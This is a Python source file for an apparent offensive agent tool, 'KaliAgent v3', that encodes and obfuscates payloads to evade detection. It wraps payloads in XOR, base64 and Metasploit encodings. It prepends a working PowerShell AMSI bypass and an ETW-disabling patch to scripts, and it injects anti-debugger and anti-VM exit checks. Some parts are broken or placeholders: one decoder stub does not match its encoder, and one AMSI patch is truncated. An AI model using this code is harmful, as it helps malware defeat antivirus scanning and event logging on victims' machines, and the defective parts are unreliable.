#!/usr/bin/env python3
"""
KaliAgent v3 - Payload Encoder & Obfuscator
============================================

Encodes and obfuscates payloads to evade detection.

Tasks: 3.2.2, 3.2.3
Status: IMPLEMENTED
"""

import base64
import hashlib
import subprocess
import logging
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from datetime import datetime

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


# =============================================================================
# Task 3.2.2: Encoding & Obfuscation Techniques
# =============================================================================

class EncoderType:
    """Available encoders."""
    BASE64 = 'base64'
    BASE32 = 'base32'
    HEX = 'hex'
    XOR = 'xor'
    XOR_DYNAMIC = 'xor_dynamic'
    SHIKATA_GA_NAI = 'shikata_ga_nai'
    ALPHANUMERIC = 'alphanumeric'
    CALL4D = 'call4_d'
    FENSTER = 'fenster'
    NONALPHA = 'nonalpha'
    NONUPPER = 'nonupper'
    AVOID_UTF8 = 'avoid_utf8'
    AVOID_NULL = 'avoid_null'


class ObfuscationTechnique:
    """Obfuscation techniques."""
    STRING_ENCRYPTION = 'string_encryption'
    CONTROL_FLOW = 'control_flow'
    DEAD_CODE = 'dead_code'
    ANTI_DEBUG = 'anti_debug'
    ANTI_VM = 'anti_vm'
    TIMING_CHECK = 'timing_check'
    PROCESS_INJECTION = 'process_injection'
    DLL_HIJACKING = 'dll_hijacking'


@dataclass
class EncodeResult:
    """Result of encoding operation."""
    success: bool
    encoded_path: Optional[Path]
    original_path: Path
    encoder: str
    original_size: int
    encoded_size: int
    expansion_ratio: float
    hash_original: str
    hash_encoded: str
    decoder_stub: str
    error: Optional[str] = None


class PayloadEncoder:
    """
    Encodes and obfuscates payloads.
    
    Provides:
    - Multiple encoding schemes
    - Custom XOR keys
    - Metasploit encoders
    - Obfuscation techniques
    - Decoder stub generation
    """
    
    def __init__(self, output_dir: Optional[Path] = None):
        """Initialize encoder."""
        self.output_dir = output_dir or Path.home() / 'kali_agent_v3' / 'encoded'
        self.output_dir.mkdir(parents=True, exist_ok=True)
        
        self.encode_history: List[EncodeResult] = []
        
        # XOR default key
        self.default_xor_key = b'\x41\x42\x43\x44'  # ABCD
        
        logger.info(f"Payload encoder initialized (output: {self.output_dir})")
    
    def encode(self, input_path: Path, encoder: str, 
              output_name: Optional[str] = None,
              xor_key: Optional[bytes] = None,
              iterations: int = 1) -> EncodeResult:
        """
        Encode a payload.
        
        Args:
            input_path: Input payload file
            encoder: Encoder type to use
            output_name: Output filename
            xor_key: Custom XOR key (for XOR encoder)
            iterations: Number of encoding iterations
            
        Returns:
            EncodeResult with encoding details
        """
        logger.info(f"Encoding payload: {input_path.name}")
        logger.info(f"  Encoder: {encoder}")
        logger.info(f"  Iterations: {iterations}")
        
        if not input_path.exists():
            return EncodeResult(
                success=False,
                encoded_path=None,
                original_path=input_path,
                encoder=encoder,
                original_size=0,
                encoded_size=0,
                expansion_ratio=0.0,
                hash_original='',
                hash_encoded='',
                decoder_stub='',
                error=f'Input file not found: {input_path}'
            )
        
        # Read input
        with open(input_path, 'rb') as f:
            original_data = f.read()
        
        original_size = len(original_data)
        original_hash = hashlib.sha256(original_data).hexdigest()
        
        # Encode based on type
        if encoder == EncoderType.BASE64:
            encoded_data = self._encode_base64(original_data, iterations)
        elif encoder == EncoderType.BASE32:
            encoded_data = self._encode_base32(original_data, iterations)
        elif encoder == EncoderType.HEX:
            encoded_data = self._encode_hex(original_data, iterations)
        elif encoder == EncoderType.XOR:
            encoded_data = self._encode_xor(original_data, xor_key or self.default_xor_key, iterations)
        elif encoder == EncoderType.XOR_DYNAMIC:
            encoded_data = self._encode_xor_dynamic(original_data, iterations)
        elif encoder in [EncoderType.SHIKATA_GA_NAI, EncoderType.ALPHANUMERIC, 
                        EncoderType.CALL4D, EncoderType.FENSTER]:
            # Use msfencode if available
            return self._encode_with_msf(input_path, encoder, output_name, iterations)
        else:
            return EncodeResult(
                success=False,
                encoded_path=None,
                original_path=input_path,
                encoder=encoder,
                original_size=original_size,
                encoded_size=0,
                expansion_ratio=0.0,
                hash_original=original_hash,
                hash_encoded='',
                decoder_stub='',
                error=f'Unknown encoder: {encoder}'
            )
        
        # Generate output path
        if not output_name:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            output_name = f"{input_path.stem}_encoded_{encoder}_{timestamp}{input_path.suffix}"
        
        output_path = self.output_dir / output_name
        
        # Write encoded data
        with open(output_path, 'wb') as f:
            f.write(encoded_data)
        
        encoded_size = len(encoded_data)
        encoded_hash = hashlib.sha256(encoded_data).hexdigest()
        
        # Generate decoder stub
        decoder_stub = self._generate_decoder_stub(encoder, xor_key or self.default_xor_key)
        
        result = EncodeResult(
            success=True,
            encoded_path=output_path,
            original_path=input_path,
            encoder=encoder,
            original_size=original_size,
            encoded_size=encoded_size,
            expansion_ratio=encoded_size / original_size if original_size > 0 else 0,
            hash_original=original_hash,
            hash_encoded=encoded_hash,
            decoder_stub=decoder_stub
        )
        
        self.encode_history.append(result)
        logger.info(f"✅ Encoded: {output_path} ({encoded_size} bytes, {result.expansion_ratio:.2f}x)")
        
        return result
    
    def _encode_base64(self, data: bytes, iterations: int) -> bytes:
        """Base64 encode."""
        encoded = data
        for _ in range(iterations):
            encoded = base64.b64encode(encoded)
        return encoded
    
    def _encode_base32(self, data: bytes, iterations: int) -> bytes:
        """Base32 encode."""
        encoded = data
        for _ in range(iterations):
            encoded = base64.b32encode(encoded)
        return encoded
    
    def _encode_hex(self, data: bytes, iterations: int) -> bytes:
        """Hex encode."""
        encoded = data
        for _ in range(iterations):
            encoded = encoded.hex().encode('ascii')
        return encoded
    
    def _encode_xor(self, data: bytes, key: bytes, iterations: int) -> bytes:
        """XOR encode with static key."""
        encoded = bytearray(data)
        
        for _ in range(iterations):
            for i in range(len(encoded)):
                encoded[i] ^= key[i % len(key)]
        
        return bytes(encoded)
    
    def _encode_xor_dynamic(self, data: bytes, iterations: int) -> bytes:
        """XOR encode with dynamic key."""
        encoded = bytearray(data)
        
        # Generate dynamic key from data hash
        key = hashlib.sha256(data).digest()[:4]
        
        for _ in range(iterations):
            for i in range(len(encoded)):
                # Dynamic key based on position
                key_byte = (key[i % len(key)] + i) % 256
                encoded[i] ^= key_byte
        
        # Prepend key for decoding
        return key + bytes(encoded)
    
    def _encode_with_msf(self, input_path: Path, encoder: str,
                        output_name: Optional[str],
                        iterations: int) -> EncodeResult:
        """Encode using msfencode (Metasploit)."""
        # Check for msfencode
        try:
            result = subprocess.run(
                ['msfencode', '-h'],
                capture_output=True,
                timeout=10
            )
            msfencode_available = result.returncode == 0
        except Exception:
            msfencode_available = False
        
        if not msfencode_available:
            # Fallback to basic encoding
            logger.warning("msfencode not available, using fallback")
            with open(input_path, 'rb') as f:
                data = f.read()
            
            # Use XOR as fallback
            return self._encode_with_fallback(input_path, data, output_name)
        
        # Generate output path
        if not output_name:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            output_name = f"{input_path.stem}_encoded_{encoder}_{timestamp}{input_path.suffix}"
        
        output_path = self.output_dir / output_name
        
        # Build msfencode command
        cmd = [
            'msfencode',
            '-i', str(input_path),
            '-e', encoder,
            '-c', str(iterations),
            '-o', str(output_path)
        ]
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300
            )
            
            if result.returncode != 0 or not output_path.exists():
                return self._encode_with_fallback(input_path, open(input_path, 'rb').read(), output_name)
            
            # Success
            with open(input_path, 'rb') as f:
                original_data = f.read()
            
            with open(output_path, 'rb') as f:
                encoded_data = f.read()
            
            return EncodeResult(
                success=True,
                encoded_path=output_path,
                original_path=input_path,
                encoder=encoder,
                original_size=len(original_data),
                encoded_size=len(encoded_data),
                expansion_ratio=len(encoded_data) / len(original_data),
                hash_original=hashlib.sha256(original_data).hexdigest(),
                hash_encoded=hashlib.sha256(encoded_data).hexdigest(),
                decoder_stub=f'# Use msfdecode -i {output_path} to decode'
            )
            
        except Exception:
            return self._encode_with_fallback(input_path, open(input_path, 'rb').read(), output_name)
    
    def _encode_with_fallback(self, input_path: Path, data: bytes,
                             output_name: str) -> EncodeResult:
        """Fallback encoding when msfencode unavailable."""
        # Use XOR dynamic
        encoded = self._encode_xor_dynamic(data, 1)
        
        output_path = self.output_dir / output_name
        with open(output_path, 'wb') as f:
            f.write(encoded)
        
        return EncodeResult(
            success=True,
            encoded_path=output_path,
            original_path=input_path,
            encoder='xor_dynamic_fallback',
            original_size=len(data),
            encoded_size=len(encoded),
            expansion_ratio=len(encoded) / len(data),
            hash_original=hashlib.sha256(data).hexdigest(),
            hash_encoded=hashlib.sha256(encoded).hexdigest(),
            decoder_stub='# XOR dynamic encoding - key is first 4 bytes'
        )
    
    def _generate_decoder_stub(self, encoder: str, xor_key: bytes) -> str:
        """Generate decoder stub for encoded payload."""
        if encoder == EncoderType.BASE64:
            return '''
# Base64 Decoder
import base64
with open('encoded.bin', 'rb') as f:
    encoded = f.read()
decoded = base64.b64decode(encoded)
with open('decoded.bin', 'wb') as f:
    f.write(decoded)
'''
        elif encoder == EncoderType.HEX:
            return '''
# Hex Decoder
with open('encoded.bin', 'rb') as f:
    encoded = f.read().decode('ascii')
decoded = bytes.fromhex(encoded)
with open('decoded.bin', 'wb') as f:
    f.write(decoded)
'''
        elif encoder in [EncoderType.XOR, EncoderType.XOR_DYNAMIC]:
            key_hex = xor_key.hex()
            return f'''
# XOR Decoder
key = bytes.fromhex('{key_hex}')
with open('encoded.bin', 'rb') as f:
    encoded = f.read()
decoded = bytearray()
for i, b in enumerate(encoded):
    decoded.append(b ^ key[i % len(key)])
with open('decoded.bin', 'wb') as f:
    f.write(bytes(decoded))
'''
        else:
            return '# Decoder stub not available for this encoder'
    
    # =====================================================================
    # Task 3.2.3: AMSI/ETW Evasion
    # =====================================================================
    
    def patch_amsi(self, input_path: Path, output_name: Optional[str] = None) -> Tuple[bool, str]:
        """
        Patch AMSI (Antimalware Scan Interface) in PowerShell script.
        
        Args:
            input_path: Input PowerShell script
            output_name: Output filename
            
        Returns:
            Tuple of (success, message)
        """
        if not input_path.exists():
            return False, f"File not found: {input_path}"
        
        # Read input
        with open(input_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        # AMSI patch patterns
        amsi_patches = [
            # Patch 1: Return FALSE
            '[Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true)',
            
            # Patch 2: Memory patch
            '''
$bytes = [System.Text.Encoding]::ASCII.GetBytes([Convert]::ToBase64String([Convert]::FromBase64String('JABBAU...')))
$addr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($bytes)
''',
            
            # Patch 3: Simple disable
            '$amsi = [Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils''); if($amsi){ $amsi.GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true) }'
        ]
        
        # Add patch to beginning of script
        patched_content = amsi_patches[0] + '\n\n' + content
        
        # Generate output path
        if not output_name:
            datetime.now().strftime('%Y%m%d_%H%M%S')
            output_name = f"{input_path.stem}_amsi_patched{input_path.suffix}"
        
        output_path = self.output_dir / output_name
        
        # Write patched content
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(patched_content)
        
        logger.info(f"AMSI patch applied: {output_path}")
        
        return True, f"AMSI patched: {output_path}"
    
    def patch_etw(self, input_path: Path, output_name: Optional[str] = None) -> Tuple[bool, str]:
        """
        Patch ETW (Event Tracing for Windows) in payload.
        
        Args:
            input_path: Input file
            output_name: Output filename
            
        Returns:
            Tuple of (success, message)
        """
        if not input_path.exists():
            return False, f"File not found: {input_path}"
        
        # ETW patch for PowerShell
        etw_patch = '''
# ETW Patch
$etw = [System.Diagnostics.Eventing.EventProvider]
if ($etw) {
    $etw.GetField(''m_enabled'', ''NonPublic,Instance'').SetValue([System.Diagnostics.Eventing.EventProvider]::new([Guid]::Empty), $false)
}
'''
        
        # Read input
        with open(input_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        # Add patch
        patched_content = etw_patch + '\n\n' + content
        
        # Generate output path
        if not output_name:
            datetime.now().strftime('%Y%m%d_%H%M%S')
            output_name = f"{input_path.stem}_etw_patched{input_path.suffix}"
        
        output_path = self.output_dir / output_name
        
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(patched_content)
        
        logger.info(f"ETW patch applied: {output_path}")
        
        return True, f"ETW patched: {output_path}"
    
    def add_obfuscation(self, input_path: Path, techniques: List[str],
                       output_name: Optional[str] = None) -> Tuple[bool, str]:
        """
        Add obfuscation techniques to payload.
        
        Args:
            input_path: Input file
            techniques: List of obfuscation techniques
            output_name: Output filename
            
        Returns:
            Tuple of (success, message)
        """
        if not input_path.exists():
            return False, f"File not found: {input_path}"
        
        # Read input
        with open(input_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        obfuscated = content
        
        for technique in techniques:
            if technique == ObfuscationTechnique.STRING_ENCRYPTION:
                obfuscated = self._obfuscate_strings(obfuscated)
            elif technique == ObfuscationTechnique.CONTROL_FLOW:
                obfuscated = self._obfuscate_control_flow(obfuscated)
            elif technique == ObfuscationTechnique.DEAD_CODE:
                obfuscated = self._add_dead_code(obfuscated)
            elif technique == ObfuscationTechnique.ANTI_DEBUG:
                obfuscated = self._add_anti_debug(obfuscated)
            elif technique == ObfuscationTechnique.ANTI_VM:
                obfuscated = self._add_anti_vm(obfuscated)
            else:
                logger.warning(f"Unknown obfuscation technique: {technique}")
        
        # Generate output path
        if not output_name:
            datetime.now().strftime('%Y%m%d_%H%M%S')
            output_name = f"{input_path.stem}_obfuscated{input_path.suffix}"
        
        output_path = self.output_dir / output_name
        
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(obfuscated)
        
        logger.info(f"Obfuscation applied ({len(techniques)} techniques): {output_path}")
        
        return True, f"Obfuscated: {output_path}"
    
    def _obfuscate_strings(self, content: str) -> str:
        """Obfuscate strings with base64 encoding."""
        import re
        
        def replace_string(match):
            string = match.group(1)
            encoded = base64.b64encode(string.encode()).decode()
            return f'[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{encoded}"))'
        
        # Replace quoted strings
        obfuscated = re.sub(r'"([^"]+)"', replace_string, content)
        
        return obfuscated
    
    def _obfuscate_control_flow(self, content: str) -> str:
        """Add control flow obfuscation."""
        # Add random if statements that always evaluate true
        junk = '''
if ($true) {
    # Control flow obfuscation
}
if (1 -eq 1) {
    # More obfuscation
}
'''
        return junk + '\n' + content
    
    def _add_dead_code(self, content: str) -> str:
        """Add dead code that never executes."""
        dead_code = '''
# Dead code - never executes
if ($false) {
    $x = 1
    $y = 2
    $z = $x + $y
    Write-Host "This never runs"
}
'''
        return dead_code + '\n' + content
    
    def _add_anti_debug(self, content: str) -> str:
        """Add anti-debugging checks."""
        anti_debug = '''
# Anti-debug check
$debuggers = @('ollydbg', 'x64dbg', 'windbg', 'immunity')
$processes = Get-Process
foreach ($dbg in $debuggers) {
    if ($processes | Where-Object {$_.ProcessName -like "*$dbg*"}) {
        exit
    }
}
'''
        return anti_debug + '\n' + content
    
    def _add_anti_vm(self, content: str) -> str:
        """Add anti-VM checks."""
        anti_vm = '''
# Anti-VM check
$vm_indicators = @('vmware', 'virtualbox', 'vbox', 'qemu', 'xen')
$hardware = Get-WmiObject Win32_ComputerSystem
if ($vm_indicators | Where-Object {$hardware.Manufacturer -like "*$_*"}) {
    exit
}
'''
        return anti_vm + '\n' + content
    
    # =====================================================================
    # Encoder Management
    # =====================================================================
    
    def list_encoders(self) -> List[Dict]:
        """List available encoders."""
        encoders = [
            {'name': EncoderType.BASE64, 'description': 'Base64 encoding', 'expansion': '1.33x'},
            {'name': EncoderType.BASE32, 'description': 'Base32 encoding', 'expansion': '1.6x'},
            {'name': EncoderType.HEX, 'description': 'Hexadecimal encoding', 'expansion': '2x'},
            {'name': EncoderType.XOR, 'description': 'XOR with static key', 'expansion': '1x'},
            {'name': EncoderType.XOR_DYNAMIC, 'description': 'XOR with dynamic key', 'expansion': '1x + 4 bytes'},
            {'name': EncoderType.SHIKATA_GA_NAI, 'description': 'Polymorphic XOR (Metasploit)', 'expansion': 'variable'},
            {'name': EncoderType.ALPHANUMERIC, 'description': 'Alphanumeric only', 'expansion': 'variable'},
            {'name': EncoderType.CALL4D, 'description': 'Call+4 decoder', 'expansion': 'variable'},
            {'name': EncoderType.FENSTER, 'description': 'Fenster decoder', 'expansion': 'variable'},
        ]
        
        return encoders
    
    def list_encoded_payloads(self, limit: int = 20) -> List[Dict]:
        """List recent encoded payloads."""
        return [
            {
                'original': r.original_path.name,
                'encoded': r.encoded_path.name if r.encoded_path else None,
                'encoder': r.encoder,
                'original_size': r.original_size,
                'encoded_size': r.encoded_size,
                'expansion': f"{r.expansion_ratio:.2f}x",
                'success': r.success
            }
            for r in self.encode_history[-limit:]
        ]


# =============================================================================
# CLI Interface
# =============================================================================

def main():
    """Command-line interface for payload encoder."""
    import argparse
    
    parser = argparse.ArgumentParser(description='KaliAgent v3 - Payload Encoder')
    parser.add_argument('--encode', type=str, help='Encode a file')
    parser.add_argument('--encoder', type=str, default='xor_dynamic',
                       choices=['base64', 'base32', 'hex', 'xor', 'xor_dynamic', 
                               'shikata_ga_nai', 'alphanumeric'],
                       help='Encoder to use')
    parser.add_argument('--iterations', type=int, default=1, help='Encoding iterations')
    parser.add_argument('--output', type=str, help='Output filename')
    parser.add_argument('--amsi', type=str, help='Patch AMSI in PowerShell script')
    parser.add_argument('--etw', type=str, help='Patch ETW in payload')
    parser.add_argument('--obfuscate', type=str, help='Add obfuscation to file')
    parser.add_argument('--list-encoders', action='store_true', help='List encoders')
    parser.add_argument('--list-encoded', action='store_true', help='List encoded payloads')
    
    args = parser.parse_args()
    
    encoder = PayloadEncoder()
    
    if args.list_encoders:
        encoders = encoder.list_encoders()
        print("\nAvailable Encoders:")
        print("=" * 60)
        for e in encoders:
            print(f"  • {e['name']}: {e['description']} ({e['expansion']})")
        print("=" * 60)
    
    elif args.list_encoded:
        payloads = encoder.list_encoded_payloads()
        print(f"\nEncoded Payloads: {len(payloads)}")
        print("=" * 60)
        for p in payloads:
            status = "✅" if p['success'] else "❌"
            print(f"{status} {p['original']} → {p['encoded']} ({p['encoder']}, {p['expansion']})")
        print("=" * 60)
    
    elif args.amsi:
        success, message = encoder.patch_amsi(Path(args.amsi))
        status = "✅" if success else "❌"
        print(f"{status} AMSI Patch: {message}")
    
    elif args.etw:
        success, message = encoder.patch_etw(Path(args.etw))
        status = "✅" if success else "❌"
        print(f"{status} ETW Patch: {message}")
    
    elif args.obfuscate:
        techniques = [
            ObfuscationTechnique.STRING_ENCRYPTION,
            ObfuscationTechnique.DEAD_CODE,
            ObfuscationTechnique.ANTI_DEBUG
        ]
        success, message = encoder.add_obfuscation(Path(args.obfuscate), techniques)
        status = "✅" if success else "❌"
        print(f"{status} Obfuscation: {message}")
    
    elif args.encode or True:  # Default to encode demo
        if not args.encode:
            print("No input file specified. Use --encode <file>")
            return
        
        result = encoder.encode(
            Path(args.encode),
            args.encoder,
            args.output,
            iterations=args.iterations
        )
        
        print("\nEncoding Result:")
        print("=" * 60)
        print(f"Success: {'✅ Yes' if result.success else '❌ No'}")
        
        if result.success:
            print(f"Output: {result.encoded_path}")
            print(f"Original: {result.original_size} bytes")
            print(f"Encoded: {result.encoded_size} bytes")
            print(f"Expansion: {result.expansion_ratio:.2f}x")
            print("\nDecoder Stub:")
            print(result.decoder_stub)
        else:
            print(f"Error: {result.error}")
        
        print("=" * 60)


if __name__ == '__main__':
    main()
